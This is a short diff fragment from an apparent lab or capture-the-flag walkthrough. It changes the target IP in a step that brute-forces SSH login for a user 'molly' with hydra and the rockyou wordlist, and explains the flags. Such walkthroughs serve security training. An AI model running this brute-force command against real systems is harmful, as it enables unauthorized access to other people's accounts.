@@ -63,7 +63,7 @@ Step 5: Brute Force SSH
 Next, brute-force the SSH service.
 
 Command:
-hydra -l molly -P /usr/share/wordlists/rockyou.txt 10.49.145.209 -t4 ssh
+hydra -l molly -P /usr/share/wordlists/rockyou.txt 10.48.164.190 -t4 ssh
 Explanation:
 ssh → targets SSH service
 -t4 → 4 parallel threads (faster attack)
